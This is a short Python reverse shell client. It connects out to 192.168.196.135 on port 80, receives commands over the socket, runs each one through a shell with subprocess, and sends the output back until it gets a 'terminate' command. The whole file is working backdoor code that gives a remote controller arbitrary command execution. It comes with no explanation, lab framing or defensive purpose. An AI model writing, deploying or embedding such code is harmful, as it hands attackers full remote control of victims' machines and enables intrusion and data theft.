import socket
import subprocess

def connect():
    s = socket.socket()
    s.connect(("192.168.196.135", 80))
    
    while True:
        command = s.recv(1024)

        if command == '':
            s.close()
            continue
        elif 'terminate' in command.decode():
            try:
                s.close()
                break
            except:
                pass
        else:
            try:
                CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(CMD.stdout.read())
                s.send(CMD.stderr.read())          
            except:
                break
def main():
    connect()
main()
